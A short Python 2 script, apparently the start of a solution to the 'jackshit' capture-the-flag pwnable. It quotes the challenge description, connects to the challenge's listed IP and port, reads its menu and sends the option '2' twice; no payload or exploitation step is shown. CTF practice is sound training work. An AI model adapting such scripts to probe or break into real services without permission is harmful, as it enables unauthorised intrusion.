__author__ = 'HuyNA'

"""
jackshit
Pwnables (200 pts)
You have travelled back in time only to find The Plague has secured his services (UPDATED) (at 54.198.56.199:1282) with the current state of the art in system call filtering. Can you break in to find a clue as to where he might be?
(This is 32-bit Ubuntu instance, with this libc)
UPDATED TO REMOVE THE STACK PROTECTOR. This is what I deserve for not testing a problem :|
The old binary is running at 54.198.56.199:1283
"""


import os
import socket
import time
import struct
import sys
import base64

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "54.198.56.199"
local_host="192.168.248.172"
port = 1282
s.connect((host, port))
#s.connect((local_host, port))

def recv_until(sock, delim):
    buf = ""
    while True:
        c = sock.recv(1)
        buf += c
        if delim in buf:
            break
    return buf

print recv_until(s, "\n")
print recv_until(s, "4. imma be or not 2b.\n")

command = "2\n"
s.send(command)
print recv_until(s, "4. imma be or not 2b.\n")
command = "2\n"
s.send(command)
print recv_until(s, "4. imma be or not 2b.\n")